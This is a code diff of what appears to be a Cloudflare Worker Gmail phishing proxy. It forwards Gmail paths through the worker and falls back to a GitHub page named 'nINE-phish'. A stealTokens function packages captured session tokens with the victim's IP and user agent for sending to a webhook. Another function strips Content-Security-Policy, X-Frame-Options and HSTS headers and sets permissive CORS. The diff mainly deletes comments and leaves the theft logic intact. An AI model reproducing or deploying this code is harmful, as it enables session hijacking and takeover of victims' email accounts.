@@ -14,12 +14,10 @@ async function handleRequest(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
   const userAgent = request.headers.get('User-Agent')?.substring(0, 200) || 'unknown';
 
-  // NGINX-STYLE RATE LIMITING (100 reqs/hour per IP)
   if (isRateLimited(clientIP)) {
     return new Response('Too Many Requests', { status: 429 });
   }
 
-  // PROXY GMAIL CRITICAL PATHS (nginx location /mail/ style)
   const gmailPaths = [
     '/mail/', '/mail/u/', '/static/', '/chrome/', '/sync/', '/accounts/',
     '/serviceworker/', '/_/', '/s/i/', '/mail/client/', '/favicon.ico'
@@ -30,7 +28,6 @@ async function handleRequest(request) {
     return await proxyGmail(url, request, clientIP, userAgent);
   }
 
-  // FALLBACK: Clean GitHub landing (no phish branding)
   return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
 }
 
@@ -107,9 +104,7 @@ function extractTokens(headers) {
 
 async function stealTokens(tokens, ip, ua, url) {
   const shortUA = ua.length > 100 ? ua.substring(0, 97) + '...' : ua;
-  const preview = tokens.slice(0, 5).map(t => 
-    `\`${t.name}\`: ${t.value.slice(0, 20)}...`
-  ).join('\n');
+  const preview = tokens.slice(0, 5).map(t => `\`${t.name}\`: ${t.value.slice(0, 20)}...`).join('\n');
 
   const payload = {
     username: '📧 Gmail Proxy',
@@ -135,19 +130,16 @@ async function stealTokens(tokens, ip, ua, url) {
 function craftResponse(response) {
   const headers = new Headers(response.headers);
 
-  // NGINX-STYLE SECURITY HEADER STRIPPING
   headers.delete('Content-Security-Policy');
   headers.delete('Content-Security-Policy-Report-Only');
   headers.delete('X-Frame-Options');
   headers.delete('Strict-Transport-Security');
   headers.delete('X-Content-Type-Options');
 
-  // CORS BYPASS
   headers.set('Access-Control-Allow-Origin', '*');
   headers.set('Access-Control-Allow-Credentials', 'true');
   headers.set('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
 
-  // COOKIE SAME-SITE FIX
   const cookies = headers.getSetCookie() || [];
   headers.delete('Set-Cookie');
   
